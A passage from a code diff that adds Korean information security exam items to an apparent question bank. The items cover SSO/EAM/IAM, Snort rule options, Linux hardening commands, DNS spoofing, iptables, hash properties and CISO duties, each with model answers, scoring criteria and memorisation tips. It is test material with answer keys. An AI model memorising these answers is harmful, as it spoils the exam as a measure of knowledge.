+          "• 개념: 사용자가 단 한 번의 로그인(인증)을 수행하면, 연동된 복수의 이기종 정보시스템에 별도의 추가 로그인 없이 자동으로 접근할 수 있도록 해주는 통합 인증 기술이다.\n• 장점: 복수 패스워드 기억 부담 완화로 사용자 편의성이 극대화되며, 중앙 인증 서버를 통해 세션 관리 및 패스워드 정책을 일원화할 수 있다.",
+        scoringCriteria: "단 1회 인증으로 복수 시스템 접근(2점), 중앙 집중 인증 및 편의성(2점) -> 총 4점",
+      },
+      {
+        number: 2,
+        question:
+          "EAM (Extranet Access Management)의 개념과 SSO 대비 추가되는 핵심 기능을 기술하시오.",
+        answer:
+          "• 개념: SSO의 통합 인증 기능에 더하여, 사용자 역할(Role)이나 보안 정책에 따라 세부 자원(URL, 메뉴, 트랜잭션)에 대한 접근 권한을 제어하는 통합 인가(Authorization) 관리 솔루션이다.\n• 차이점: SSO가 '사용자가 누구인가(인증)'를 해결한다면, EAM은 '어떤 자원에 접근할 수 있는가(접근 통제 및 권한 관리)'를 세밀하게 제어한다.",
+        scoringCriteria: "SSO 기능 포함(2점), 세부 자원 접근 제어 및 인가(Authorization) 관리(3점) -> 총 5점",
+      },
+      {
+        number: 3,
+        question:
+          "IAM (Identity & Access Management)의 개념과 EAM 대비 확장된 거버넌스 관리 영역을 기술하시오.",
+        answer:
+          "• 개념: SSO와 EAM 기능을 모두 포괄하며, 인사 DB와 연동하여 사용자의 입사, 전보, 승진, 퇴사 등 라이프사이클에 따른 계정 자동 생성(프로비저닝) 및 권한 회수(디프로비저닝), 전사적 권한 감사 및 컴플라이언스를 총괄하는 통합 ID 거버넌스 체계이다.\n• 차이점: 퇴사자 권한 방치와 같은 내부자 보안 위협을 원천 차단하고, 전사적인 계정 및 권한 수명주기 전체를 중앙 통제한다.",
+        scoringCriteria: "SSO/EAM 포괄(2점), 인사 연동 계정 프로비저닝/디프로비저닝 및 전사 거버넌스(3점) -> 총 5점",
+      },
+    ],
+    answer: [
+      "1. SSO: 1회 로그인으로 복수 이기종 시스템 무재인증 접근 (통합 인증)",
+      "2. EAM: SSO + 세부 자원에 대한 역할/정책 기반 접근 권한 통제 (통합 인가)",
+      "3. IAM: SSO + EAM + 인사 DB 연동 계정 프로비저닝/디프로비저닝 라이프사이클 및 전사 ID 거버넌스 관리",
+    ],
+    scoringPoints: [
+      "SSO 개념 및 통합 인증(Authentication) 명시 (4점)",
+      "EAM 개념 및 통합 인가(Authorization/접근제어) 명시 (5점)",
+      "IAM 개념 및 계정 라이프사이클/프로비저닝/거버넌스 명시 (5점)",
+    ],
+    explanation:
+      "• 발전 계층 구조:\n`SSO (인증)` ⊂ `EAM (인증 + 인가)` ⊂ `IAM (인증 + 인가 + 수명주기 프로비저닝 + 거버넌스)`\n• 엔터프라이즈 환경에서의 핵심:\n단순 인증 편의성(SSO)에서 자원 보호(EAM)를 거쳐, 퇴사자 및 전보자에 대한 자동 권한 회수 및 컴플라이언스 준수(IAM)로 발전하고 있습니다.",
+    examTips:
+      "2025년 3회차 실기 서술형 11번 기출입니다. 인증(Authentication), 인가(Authorization), 계정 프로비저닝(Provisioning) 3대 키워드를 명확히 구분하여 서술하세요.",
+  },
+
+  // =================================================================
+  // [문제 127] 서술·실무형 (14점) - 네트워크 보안 (2025년 3회차 실기 기출)
+  // =================================================================
+  {
+    id: 127,
+    subjectId: "network",
+    type: "descriptive",
+    score: 14,
+    domain: "네트워크 보안",
+    title: "Snort IDS 침해 탐지 룰 최적화 및 고속 탐지 키워드 분석",
+    description:
+      "네트워크 침입 탐지 시스템인 Snort의 탐지 룰 작성 및 성능 최적화에 관한 실무 서술형 물음이다. 하위 물음에 답하시오.",
+    codeBlock: {
+      language: "bash",
+      code: `alert tcp any any -> 192.168.1.0/24 80 (msg:"ATTACK DETECTED"; content:"GET"; offset:0; depth:3; content:"/admin"; distance:1; within:10; sid:1000001;)`,
+    },
+    subItems: [
+      {
+        number: 1,
+        question:
+          "Snort 침해 탐지 룰을 작성할 때 페이로드 검사 범위를 너무 넓거나 포괄적으로 설정했을 때 발생하는 시스템 및 보안 관제 측면의 문제점 2가지를 기술하시오.",
+        answer:
+          "1. 오탐(False Positive)의 급증: 정상적인 트래픽까지 공격으로 오인 탐지하여 보안 관제 인력의 경보 피로도(Alert Fatigue)를 가중시킨다.\n2. 센서 시스템 부하 및 패킷 드랍(Packet Drop) 발생: 대용량 트래픽의 페이로드 전수를 깊게 검사함에 따라 NIDS 엔진의 CPU/메모리 부하가 급증하여 패킷을 제때 처리하지 못하고 유실(Drop)하는 심각한 보안 공백이 발생한다.",
+        scoringCriteria: "오탐(False Positive) 급증(3점), 센서 부하 및 패킷 드랍(Packet Drop) 발생(3점) -> 총 6점",
+      },
+      {
+        number: 2,
+        question:
+          "위 룰에 사용된 고속 탐지 키워드 중 절대 위치 지정 옵션(offset, depth)과 상대 위치 지정 옵션(distance, within)의 동작 원리를 각각 비교 서술하시오.",
+        answer:
+          "• 절대 위치 옵션:\n - `offset`: 패킷 페이로드의 맨 처음(0바이트)을 기준으로 탐색을 시작할 바이트 위치를 지정한다.\n - `depth`: offset 시작 지점부터 검사할 최대 바이트 길이를 제한한다.\n• 상대 위치 옵션:\n - `distance`: 직전 `content` 패턴 매칭이 성공한 끝 지점으로부터 건너뛸 상대적 바이트 수를 지정한다.\n - `within`: distance 지점부터 후속 패턴을 탐색할 최대 바이트 범위를 제한한다.",
+        scoringCriteria: "offset/depth 절대 위치 설명(4점), distance/within 상대 위치 설명(4점) -> 총 8점",
+      },
+    ],
+    answer: [
+      "1. 룰 광범위 설정 문제점:\n - 오탐(False Positive) 급증으로 관제 피로도 증가\n - 정밀 전수 검사로 인한 센서 부하 및 패킷 드랍(Drop) 발생",
+      "2. 탐지 옵션 원리:\n - offset: 페이로드 시작 기준 검색 시작 위치 / depth: offset부터 검사할 최대 길이\n - distance: 직전 매칭 끝 기준 건너뛸 상대 위치 / within: distance부터 검사할 상대적 최대 길이",
+    ],
+    scoringPoints: [
+      "오탐(False Positive) 증가 및 센서 부하/패킷 드랍 명시 (6점)",
+      "절대 위치 옵션(offset, depth) 동작 원리 (4점)",
+      "상대 위치 옵션(distance, within) 동작 원리 (4점)",
+    ],
+    explanation:
+      "• Snort 룰 성능 최적화:\n전체 페이로드를 검사하는 `content:'/admin'`보다, HTTP 요청 헤더의 앞부분만 한정하는 `offset:0; depth:3;` 등을 활용하면 불필요한 바이트 비교 연산을 획기적으로 줄여 기가비트 백본망에서도 패킷 드랍 없는 실시간 관제가 가능합니다.",
+    examTips:
+      "2025년 3회차 실기 서술형 12번 기출입니다. Snort 룰의 4대 위치 제어 옵션(offset, depth, distance, within)의 정의를 정확히 암기하세요.",
+  },
+
+  // =================================================================
+  // [문제 128] 서술·실무형 (14점) - 시스템 보안 (2025년 3회차 실기 기출)
+  // =================================================================
+  {
+    id: 128,
+    subjectId: "system",
+    type: "descriptive",
+    score: 14,
+    domain: "시스템 보안",
+    title: "리눅스 서버 기술적 취약점 분석 및 4대 필수 보안 설정 (KISA 가이드)",
+    description:
+      "주요정보통신기반시설 기술적 취약점 분석·평가 기준에 따른 Unix/Linux 서버 점검 항목이다. 각 취약점 항목에 대한 적정 보안 조치 방안을 기술하시오.",
+    subItems: [
+      {
+        number: 1,
+        question:
+          "root 관리자 계정의 원격 직접 콘솔 접속을 제한하기 위한 `/etc/securetty` 파일의 조치 방안을 기술하시오.",
+        answer:
+          "`/etc/securetty` 파일 내에서 네트워크 원격 가상 터미널인 `pts/0`, `pts/1`, `pts/2` 등의 항목을 주석 처리(`#`)하거나 삭제하여, 로컬 물리 콘솔(`console`, `tty1`~`tty6`)만을 남겨둔다.",
+        scoringCriteria: "가상 터미널(pts/*) 항목 주석 또는 삭제 명시 시 3.5점",
+      },
+      {
+        number: 2,
+        question:
+          "사용자가 로그인 후 장시간 미사용 시 세션 하이재킹을 방지하기 위해 10분간 입력이 없으면 자동 로그아웃되도록 `/etc/profile`에 설정하는 환경 변수 선언문을 작성하시오.",
+        answer:
+          "`export TMOUT=600` (또는 `TMOUT=600; export TMOUT`)",
+        scoringCriteria: "`export TMOUT=600` (초 단위 600 명시) 시 3.5점",
+      },
+      {
+        number: 3,
+        question:
+          "일반 사용자에 의한 중요 설정 파일의 임의 변조를 막기 위해 World Writable(기타 사용자 쓰기 권한) 속성을 제거하는 리눅스 chmod 명령어를 작성하시오.",
+        answer:
+          "`chmod o-w <파일명>` (또는 전체 일괄 조치 시 `find / -perm -2 -type f -exec chmod o-w {} +`)",
+        scoringCriteria: "`chmod o-w` 명시 시 3.5점",
+      },
+      {
+        number: 4,
+        question:
+          "xinetd 슈퍼 데몬 기반의 불필요한 원격 서비스(rsh, rlogin, telnet 등)를 비활성화하기 위한 설정 파일 내 파라미터 설정을 작성하시오.",
+        answer:
+          "해당 서비스 설정 파일(`/etc/xinetd.d/<서비스명>`) 내부에서 `disable = yes`로 설정한 후 xinetd 데몬을 재시작한다.",
+        scoringCriteria: "`disable = yes` 명시 시 3.5점",
+      },
+    ],
+    answer: [
+      "1. root 원격 차단: `/etc/securetty`에서 `pts/*` 가상 터미널 주석/삭제",
+      "2. 세션 타임아웃 10분: `/etc/profile`에 `export TMOUT=600`",
+      "3. World Writable 제거: `chmod o-w <파일명>`",
+      "4. xinetd 서비스 비활성화: `disable = yes`",
+    ],
+    scoringPoints: [
+      "securetty 내 pts/* 삭제/주석 (3.5점)",
+      "export TMOUT=600 (3.5점)",
+      "chmod o-w (3.5점)",
+      "disable = yes (3.5점)",
+    ],
+    explanation:
+      "• 주요정보통신기반시설 서버 취약점 점검 가이드 기준:\n1. 계정 관리: root 직접 원격 접속 차단(SSH 데몬의 `PermitRootLogin no` 및 Telnet의 `/etc/securetty` pts 제한).\n2. 세션 관리: TMOUT 환경 변수를 초 단위로 지정하여 10분(600초) 미입력 시 세션 강제 종료.\n3. 파일 관리: 모든 사용자에게 쓰기 권한이 열려 있는 World Writable 파일은 `chmod o-w`로 쓰기 권한 제거.\n4. 서비스 관리: 불필요한 xinetd 기반 r-command 서비스를 `disable = yes`로 차단.",
+    examTips:
+      "2025년 3회차 실기 서술형 13번 기출입니다. 리눅스 서버 취약점 점검의 4대 필수 지시어(pts, TMOUT, chmod o-w, disable=yes)를 철저히 암기하세요.",
+  },
+
+  // =================================================================
+  // [문제 129] 단답형 (3점) - 시스템 보안 (2026년 1회차 실기 기출)
+  // =================================================================
+  {
+    id: 129,
+    subjectId: "system",
+    type: "short",
+    score: 3,
+    domain: "시스템 보안",
+    title: "Linux /etc/passwd 패스워드 쉐도잉 표식 및 보안 관리",
+    description:
+      "`/etc/passwd` 파일에서 패스워드가 `/etc/shadow` 파일로 분리되어 안전하게 일방향 암호화 관리되고 있음을 나타내는 두 번째 필드의 표식은?",
+    scenario: "admin:x:1001:1001::/home/admin:/bin/bash",
+    answer: ["x"],
+    scoringPoints: ["표식 문자 `x` 정확히 기재 시 3점"],
+    explanation:
+      "• 쉐도잉(Shadowing) 메커니즘:\n과거에는 `/etc/passwd`의 두 번째 필드에 패스워드 해시가 직접 저장되었으나, 모든 사용자가 읽을 수 있어 취약했습니다. 현대 리눅스는 패스워드를 root만 읽을 수 있는 `/etc/shadow` 파일로 옮기고, `/etc/passwd`에는 `x`로 마스킹합니다.\n• 보안 취약점:\n두 번째 필드가 공백이거나 비어 있으면 패스워드 없이 로그인이 허용되는 중대 취약점이 발생합니다.",
+    examTips:
+      "2026년 1회차 실기 단답형 1번 기출입니다. /etc/passwd의 7개 필드와 두 번째 필드 'x'의 보안적 의미를 숙지하세요.",
+  },
+
+  // =================================================================
+  // [문제 130] 단답형 (3점) - 네트워크 보안 (2026년 1회차 실기 기출)
+  // =================================================================
+  {
+    id: 130,
+    subjectId: "network",
+    type: "short",
+    score: 3,
+    domain: "네트워크 보안",
+    title: "DNS 스푸핑 (DNS Spoofing) 공격 원리 및 캐시 포이즈닝 구분",
+    description:
+      "희생자가 도메인 질의(DNS Query)를 전송했을 때 정당한 DNS 서버보다 먼저 위조된 DNS 응답(IP) 패킷을 보내 사용자를 가짜 피싱 사이트로 유도하는 네트워크 공격 기법은?",
+    answer: ["DNS 스푸핑 (DNS Spoofing)"],
+    scoringPoints: ["DNS 스푸핑(DNS Spoofing) 기재 시 3점"],
+    explanation:
+      "• DNS 스푸핑 (DNS Spoofing):\n공격자가 희생자와 DNS 서버 사이에서 패킷을 스니핑한 후 질의의 트랜잭션 ID(Transaction ID)를 탈취하여 정당한 DNS 서버보다 먼저 위조된 응답 패킷을 클라이언트에게 보냅니다.\n• DNS 캐시 포이즈닝과의 차이:\n캐시 포이즈닝은 'DNS 캐시 네임서버'의 캐시 테이블을 오염시키는 공격이며, DNS 스푸핑은 로컬 희생자 클라이언트를 직접 속이는 공격입니다.",
+    examTips:
+      "2026년 1회차 실기 단답형 2번 기출입니다. DNS 캐시 포이즈닝과 DNS 스푸핑의 희생자 타깃 차이를 구분하세요.",
+  },
+
+  // =================================================================
+  // [문제 131] 단답형 (3점) - 네트워크 보안 (2026년 1회차 실기 기출)
+  // =================================================================
+  {
+    id: 131,
+    subjectId: "network",
+    type: "short",
+    score: 3,
+    domain: "네트워크 보안",
+    title: "iptables를 이용한 인바운드 ICMP Echo Request(Ping) 조용한 차단(DROP)",
+    description:
+      "외부로부터 들어오는 Ping(Echo Request) 요청을 공격자에게 아무런 에러 응답 없이 조용히 버리기(DROP) 위한 iptables 명령어이다. 빈칸 (1), (2), (3)을 채우시오.",
+    scenario: "iptables -A INPUT -p ( ① ) --icmp-type ( ② ) -j ( ③ )",
+    answer: [
+      "① icmp",
+      "② 8 (또는 echo-request)",
+      "③ DROP",
+    ],
+    scoringPoints: [
+      "① icmp (1점)",
+      "② 8 또는 echo-request (1점)",
+      "③ DROP (1점)",
+    ],
+    explanation:
+      "• ICMP Type:\nEcho-Request(Ping 요청)는 Type 8이며, Echo-Reply(Ping 응답)는 Type 0입니다.\n• REJECT vs DROP:\n`REJECT`는 송신자에게 'ICMP Port Unreachable' 등의 에러 패킷을 반환하여 호스트의 존재를 알리지만, `DROP`은 패킷을 조용히 무시하여 시스템의 존재를 숨깁니다.",
+    examTips:
+      "2026년 1회차 실기 단답형 3번 기출입니다. iptables의 패킷 필터링 옵션과 ICMP 메시지 유형 번호(8 요청, 0 응답)를 외우세요.",
+  },
+
+  // =================================================================
+  // [문제 132] 단답형 (3점) - 시스템 보안 (2026년 1회차 실기 기출)
+  // =================================================================
+  {
+    id: 132,
+    subjectId: "system",
+    type: "short",
+    score: 3,
+    domain: "시스템 보안",
+    title: "시스템 파일 무결성 점검 도구(Tripwire) 및 네트워크 취약점 스캐너(Nessus)",
+    description:
+      "다음 각 설명에 해당하는 대표적인 보안 도구의 명칭을 기술하시오.\n(1) 시스템 주요 파일의 해시값을 데이터베이스에 보관한 후 주기적으로 대조하여 변조를 감지하는 무결성 점검 도구\n(2) Tenable사에서 개발한 유명 종합 네트워크 취약점 진단 및 포트 스캐너 도구",
+    answer: [
+      "(1) 트립와이어 (Tripwire)",
+      "(2) Nessus (넥서스)",
+    ],
+    scoringPoints: [
+      "(1) Tripwire 또는 트립와이어 (1.5점)",
+      "(2) Nessus 또는 넥서스 (1.5점)",
+    ],
+    explanation:
+      "• Tripwire:\n시스템의 주요 바이너리와 설정 파일의 암호학적 해시값(SHA, MD5)을 사전에 저장해 두고, 백도어 침투나 파일 변조가 발생했을 때 즉각 감지하는 대표적인 HIDS 무결성 점검 도구입니다.\n• Nessus:\n서버 및 네트워크 장비의 개방 포트, 취약한 패치 버전, 기본 패스워드 설정 등을 원격에서 종합 점검해 주는 대표적인 취약점 스캐너입니다.",
+    examTips:
+      "2026년 1회차 실기 단답형 4번 기출입니다. 무결성 점검 도구(Tripwire, AIDE)와 취약점 진단 도구(Nessus, OpenVAS)의 구분을 명확히 하세요.",
+  },
+
+  // =================================================================
+  // [문제 133] 단답형 (3점) - 시스템 보안 (2026년 1회차 실기 기출)
+  // =================================================================
+  {
+    id: 133,
+    subjectId: "system",
+    type: "short",
+    score: 3,
+    domain: "시스템 보안",
+    title: "Windows IIS 서버의 HTTP 프로토콜 에러 로그 저장 경로",
+    description:
+      "Windows IIS 웹 서버에서 잘못된 요청(HTTP 400), 서버 과부하(HTTP 503) 등 HTTP 프로토콜 수준의 심각한 통신 오류 로그가 저장되는 대표적인 기본 폴더 명칭은?",
+    answer: ["httperr (또는 HTTPERR, 전체 경로: C:\\Windows\\System32\\LogFiles\\HTTPERR)"],
+    scoringPoints: ["`httperr` (또는 HTTPERR) 명칭 기재 시 3점"],
+    explanation:
+      "• HTTPERR 로그:\nIIS 웹 서버 엔진(HTTP.sys 커널 드라이버)이 사이트 레벨에 도달하기 전에 차단하거나 실패한 저수준 오류(요청 큐 초과, 비정상 헤더, 연결 타임아웃 등)를 기록하는 시스템 로그입니다.\n• 기본 저장 경로: `%SystemDrive%\\Windows\\System32\\LogFiles\\HTTPERR\\httperr*.log`",
+    examTips:
+      "2026년 1회차 실기 단답형 5번 기출입니다. Windows 시스템 로그 저장 경로 및 웹 서버 오류 디렉터리 명칭을 숙지하세요.",
+  },
+
+  // =================================================================
+  // [문제 134] 단답형 (3점) - 정보보안 일반 & 암호학 (2026년 1회차 실기 기출)
+  // =================================================================
+  {
+    id: 134,
+    subjectId: "general",
+    type: "short",
+    score: 3,
+    domain: "정보보안 일반 & 암호학",
+    title: "단방향 암호화 해시 함수 (Hash Function) 3대 저항성",
+    description:
+      "가변 길이의 입력 메시지를 고정 길이의 비트열로 출력하며 역산이 불가능한 단방향 해시 함수가 암호학적 안전성을 갖추기 위해 만족해야 하는 3대 성질(저항성)을 기술하시오.",
+    answer: [
+      "1. 1차 역상 저항성 (Pre-image Resistance, 주어진 해시값 h에 대해 H(x)=h인 x를 찾는 것이 계산적으로 불가능)",
+      "2. 2차 역상 저항성 (Second Pre-image Resistance / 약한 충돌 저항성, 주어진 x에 대해 H(x)=H(x')인 x'!=x를 찾는 것이 계산적으로 불가능)",
+      "3. 충돌 저항성 (Collision Resistance / 강한 충돌 저항성, H(x)=H(y)인 임의의 서로 다른 두 입력 x, y를 찾는 것이 계산적으로 불가능)",
+    ],
+    scoringPoints: [
+      "1차 역상 저항성, 2차 역상 저항성, 충돌 저항성 각 1점씩 총 3점",
+    ],
+    explanation:
+      "• 1차 역상 저항성: 일방향성(해시값으로부터 원문 복호화 불가).\n• 2차 역상 저항성: 특정 원본이 주어졌을 때 동일한 해시를 만드는 대체 위조문 생성 불가.\n• 충돌 저항성: 생일 공격(Birthday Attack)에 대한 저항력으로, 서로 다른 임의의 두 원문이 동일한 해시값을 갖는 충돌 쌍을 찾기 어려워야 함.",
+    examTips:
+      "2026년 1회차 실기 단답형 6번 기출입니다. 1차 역상, 2차 역상, 충돌 저항성의 정확한 정의를 구별하여 서술하세요.",
+  },
+
+  // =================================================================
+  // [문제 135] 단답형 (3점) - 정보보안 관리 및 법률 (2026년 1회차 실기 기출)
+  // =================================================================
+  {
+    id: 135,
+    subjectId: "law",
+    type: "short",
+    score: 3,
+    domain: "정보보안 관리 및 법률",
+    title: "KISA 위험 관리 6단계 프로세스 빈칸 완성",
+    description:
+      "KISA 위험 관리 가이드라인에 따른 위험 관리 6단계 프로세스이다. 빈칸 (1), (2), (3)에 들어갈 적합한 단계명을 순서대로 쓰시오.\n전략 및 계획 수립 → ( ① ) → ( ② ) → 대책 선정 → 계획 수립 → ( ③ )",
+    answer: [
+      "① 위험 분석 (Risk Analysis)",
+      "② 위험 평가 (Risk Evaluation)",
+      "③ 대책 구현 및 운영 (또는 대책 실행)",
+    ],
+    scoringPoints: [
+      "① 위험 분석 (1점)",
+      "② 위험 평가 (1점)",
+      "③ 대책 구현 및 운영 (1점)",
+    ],
+    explanation:
+      "• 위험 관리 프로세스 흐름:\n1. 위험관리 전략 및 계획 수립\n2. 위험 분석 (자산 식별, 위협/취약점 분석)\n3. 위험 평가 (위험도 산정 및 수용 가능 위험 수준 DoA와 비교)\n4. 정보보호 대책 선정 (위험 회피, 전가, 수용, 완화)\n5. 대책 계획 수립\n6. 대책 구현 및 운영 (모니터링 및 지속적 개선)",
+    examTips:
+      "2026년 1회차 실기 단답형 7번 기출입니다. 위험 분석과 위험 평가의 선후 관계를 뒤바꿔 쓰지 않도록 주의하세요.",
+  },
+
+  // =================================================================
+  // [문제 136] 단답형 (3점) - 애플리케이션 보안 (2026년 1회차 실기 기출)
+  // =================================================================
+  {
+    id: 136,
+    subjectId: "application",
+    type: "short",
+    score: 3,
+    domain: "애플리케이션 보안",
+    title: "소프트웨어 블랙박스 자동화 테스팅 - 퍼징 (Fuzzing)",
+    description:
+      "소프트웨어의 잠재적인 보안 결함, 버퍼 오버플로우, 메모리 누수, 예외 크래시를 유발하기 위해 무작위적이거나 유효하지 않은 입력 데이터(Fuzz)를 자동으로 대량 주입하여 예외 상황을 모니터링하는 블랙박스 소프트웨어 테스트 기법은?",
+    answer: ["퍼징 (Fuzzing / Fuzz Testing)"],
+    scoringPoints: ["퍼징(Fuzzing) 기재 시 3점"],
+    explanation:
+      "• 퍼징 (Fuzzing):\n공격자 관점에서 시스템 내부 소스코드를 모르는 상태에서 유효하지 않거나 예기치 못한 데이터(극단적 길이의 문자열, 비정상 바이너리 헤더 등)를 주입해 소프트웨어가 비정상 종료(Crash)되는 지점을 찾아내는 자동화된 동적 분석 기법입니다.",
+    examTips:
+      "2026년 1회차 실기 단답형 8번 기출입니다. 시큐어 코딩 및 소프트웨어 취약점 자동화 점검 도구의 원리로 출제되었습니다.",
+  },
+
+  // =================================================================
+  // [문제 137] 단답형 (3점) - 시스템 보안 (2026년 1회차 실기 기출)
+  // =================================================================
+  {
+    id: 137,
+    subjectId: "system",
+    type: "short",
+    score: 3,
+    domain: "시스템 보안",
+    title: "Sendmail 스팸 릴레이 제어 설정 파일 및 바이너리 DB 컴파일",
+    description:
+      "Sendmail 환경에서 IP 주소나 도메인별 릴레이(Relay) 허용 및 거부 정책을 설정하는 원본 텍스트 설정 파일명과, `makemap` 명령을 통해 컴파일되어 데몬이 고속 조회하는 해시 DB 파일명을 각각 쓰시오.",
+    answer: [
+      "원본 텍스트 파일: /etc/mail/access",
+      "바이너리 DB 파일: /etc/mail/access.db",
+    ],
+    scoringPoints: [
+      "텍스트 파일 `/etc/mail/access` (1.5점)",
+      "해시 DB 파일 `/etc/mail/access.db` (1.5점)",
+    ],
+    explanation:
+      "• Sendmail 접근 제어:\n스팸 릴레이 방지를 위해 `/etc/mail/access` 파일에 `Connect:spammer.com REJECT`, `Connect:192.168.1 RELAY` 등을 정의한 후, Sendmail 데몬이 직접 텍스트를 읽지 않으므로 `makemap hash /etc/mail/access.db < /etc/mail/access` 명령으로 DB화해야 적용됩니다.",
+    examTips:
+      "2026년 1회차 실기 단답형 9번 기출입니다. 리눅스 메일 서버(Sendmail)의 access 파일과 makemap 명령은 단답형 빈출입니다.",
+  },
+
+  // =================================================================
+  // [문제 138] 단답형 (3점) - 시스템 보안 (2026년 1회차 실기 기출)
+  // =================================================================
+  {
+    id: 138,
+    subjectId: "system",
+    type: "short",
+    score: 3,
+    domain: "시스템 보안",
+    title: "IIS 웹 서버 배너 정보 은폐를 위한 URL Rewrite 모듈",
+    description:
+      "IIS 웹 서버에서 공격자에게 웹 서버 종류 및 버전 정보를 노출하지 않기 위해 HTTP 응답 헤더(`Server: Microsoft-IIS/...`, `X-Powered-By`)를 제거하거나 마스킹하는 데 사용하는 IIS 공식 확장 모듈은?",
+    answer: ["URL Rewrite (URL 재작성 모듈)"],
+    scoringPoints: ["URL Rewrite (또는 URL 재작성 모듈) 기재 시 3점"],
+    explanation:
+      "• 서버 배너 정보 은닉:\n공격자는 HTTP 응답 헤더의 `Server: Microsoft-IIS/10.0`이나 `X-Powered-By: ASP.NET`을 보고 타깃 취약점 익스플로잇을 선별합니다. IIS에서는 `URL Rewrite` 모듈의 아웃바운드 규칙(Outbound Rules)을 설정하여 해당 헤더를 빈 문자열로 바꾸거나 제거할 수 있습니다.",
+    examTips:
+      "2026년 1회차 실기 단답형 10번 기출입니다. Apache의 ServerTokens/ServerSignature Off와 대비되는 IIS의 서버 정보 은폐 방안입니다.",
+  },
+
+  // =================================================================
+  // [문제 139] 단답형 (3점) - 정보보안 관리 및 법률 (2026년 1회차 실기 기출)
+  // =================================================================
+  {
+    id: 139,
+    subjectId: "law",
+    type: "short",
+    score: 3,
+    domain: "정보보안 관리 및 법률",
+    title: "정보통신망법상 집적정보통신시설 사업자 (IDC 운영자)",
+    description:
+      "정보통신망 이용촉진 및 정보보호 등에 관한 법률 제46조에 따라, 타인의 정보통신서비스 제공을 위하여 집적된 전산 설비를 위탁 운영·관리하는 자(데이터센터 운영자 등)를 가리키는 법률 용어는?",
+    answer: ["집적정보통신시설 사업자 (또는 IDC 사업자)"],
+    scoringPoints: ["집적정보통신시설 사업자 (또는 IDC 사업자) 기재 시 3점"],
+    explanation:
+      "• 정보통신망법 제46조 (집적정보통신시설의 보호):\n타인의 정보통신서비스를 제공하기 위해 전산 설비를 위탁 운영하는 '집적정보통신시설 사업자'는 지진·화재·정전 등 재난재해 및 침해사고에 대비하여 물리적·기술적 보안 보호조치 기준을 준수해야 할 법적 의무가 있습니다.",
+    examTips:
+      "2026년 1회차 실기 단답형 11번 기출입니다. 법률 조문에 명시된 주체 명칭(집적정보통신시설 사업자)을 정확히 쓰세요.",
+  },
+
+  // =================================================================
+  // [문제 140] 단답형 (3점) - 네트워크 보안 (2026년 1회차 실기 기출)
+  // =================================================================
+  {
+    id: 140,
+    subjectId: "network",
+    type: "short",
+    score: 3,
+    domain: "네트워크 보안",
+    title: "통합 보안관제 및 빅데이터 상관분석 솔루션 SIEM",
+    description:
+      "방화벽, IDS/IPS, 웹 방화벽(WAF), 서버, 엔드포인트 등 이기종 보안 장비에서 발생하는 대용량 로그를 단일 플랫폼으로 취합하고, 빅데이터 상관분석(Correlation Analysis)을 통해 지능형 지속 위협(APT)을 조기에 탐지하는 보안 관제 플랫폼의 명칭과 영문 약어를 쓰시오.",
+    answer: ["SIEM (Security Information and Event Management)"],
+    scoringPoints: ["SIEM 또는 Security Information and Event Management 명시 시 3점"],
+    explanation:
+      "• SIEM:\n보안 정보 관리(SIM: 로그 수집 및 리포팅)와 보안 이벤트 관리(SEM: 실시간 이벤트 모니터링 및 상관분석)가 결합된 통합 플랫폼입니다. 단일 이벤트로는 탐지하기 어려운 복합 위협을 시간차 상관분석으로 식별합니다.",
+    examTips:
+      "2026년 1회차 실기 단답형 12번 기출입니다. 보안관제 솔루션의 대표 핵심 용어입니다.",
+  },
+
+  // =================================================================
+  // [문제 141] 서술·실무형 (14점) - 정보보안 관리 및 법률 (2026년 1회차 실기 기출)
+  // =================================================================
+  {
+    id: 141,
+    subjectId: "law",
+    type: "descriptive",
+    score: 14,
+    domain: "정보보안 관리 및 법률",
+    title: "정보통신망법상 CISO(정보보호최고책임자)의 법정 4대 업무 권한과 책임",
+    description:
+      "정보통신망 이용촉진 및 정보보호 등에 관한 법률 시행령 제36조의7에 규정된 정보보호최고책임자(CISO)의 지정 의의와, 법령상 CISO가 수행해야 하는 주요 업무 권한과 책임을 구체적으로 4가지 서술하시오.",
+    subItems: [
+      {
+        number: 1,
+        question:
+          "CISO 제도의 도입 배경 및 일정 규모 이상 상장사에 대해 적용되는 겸직 제한 규정의 취지를 서술하시오.",
+        answer:
+          "기업의 디지털 전환 가속화에 따른 사이버 위협에 대응하여 경영진 레벨의 독립적인 정보보호 의사결정 체계를 확립하기 위함이다. 특히 자산총액 5조 원 이상 등 대규모 상장사의 경우 CISO가 타 정보통신 업무(CIO)나 개인정보보호 업무(CPO)를 겸직하지 못하도록 하여, 개발/비즈니스 편의에 밀리지 않는 독립적 보안 감독 권한을 보장한다.",
+        scoringCriteria: "독립적 보안 거버넌스 확립 및 겸직 금지 취지 명시 (4점)",
+      },
+      {
+        number: 2,
+        question:
+          "정보통신망법 시행령 제36조의7에 명시된 CISO의 핵심 법정 업무 4가지를 서술하시오.",
+        answer:
+          "1. 정보보호 관리체계의 수립 및 운영·관리\n2. 정보보호 취약점 및 위협의 분석·평가 및 개선 대책 수립\n3. 침해사고 발생 시 원인 분석 및 긴급 대응·피해 확산 방지\n4. 임직원 대상 정보보호 교육 및 훈련 계획의 수립 및 시행",
+        scoringCriteria: "4대 법정 업무(관리체계 수립, 취약점 분석평가, 침해사고 대응, 교육훈련) 각 2.5점씩 총 10점",
+      },
+    ],
+    answer: [
+      "1. 겸직 제한 취지: 정보보안의 독립성 보장 및 이해 상충 방지",
+      "2. CISO 법정 4대 업무:\n - 정보보호 관리체계의 수립 및 운영·관리\n - 정보보호 취약점 및 위협의 분석·평가 및 개선대책 수립\n - 침해사고 발생 시 원인 분석 및 긴급 대응·피해 확산 방지\n - 임직원 대상 정보보호 교육 및 훈련 계획의 수립 및 시행",
+    ],
+    scoringPoints: [
+      "독립적 보안 거버넌스 및 겸직 금지 취지 (4점)",
+      "CISO 4대 법정 업무 명확한 법률 키워드 작성 (10점)",
+    ],
+    explanation:
+      "• 정보통신망법 시행령 제36조의7 (정보보호최고책임자의 업무 등):\n법정 업무 조문의 4대 축은 ① 관리체계(ISMS), ② 취약점 분석, ③ 침해사고 대응, ④ 교육훈련입니다. 법령 단어를 정확하게 현출하는 것이 서술형 채점의 핵심 기준입니다.",
+    examTips:
+      "2026년 1회차 실기 서술형 13번 기출입니다. CISO와 CPO의 법적 구분 및 CISO 4대 업무를 완벽히 외우세요.",
+  },
+
+  // =================================================================
+  // [문제 142] 서술·실무형 (14점) - 애플리케이션 보안 (2026년 1회차 실기 기출)
+  // =================================================================
+  {
+    id: 142,
+    subjectId: "application",
+    type: "descriptive",
